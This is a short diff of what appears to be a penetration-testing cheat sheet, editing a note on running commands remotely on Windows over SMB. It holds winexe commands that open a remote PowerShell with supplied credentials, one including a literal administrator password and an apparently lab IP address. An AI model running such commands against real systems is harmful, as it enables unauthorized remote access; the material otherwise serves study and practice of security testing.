@@ -382,7 +382,7 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 ```diff
 -WIP
 ```
-Execute command remotely on Windows via SMB Creds
+Execute command remotely on Windows via SMB Creds with winexe or psexec.py
 ```
 winexe -U 'user%password' //$RHOST powershell.exe
 winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
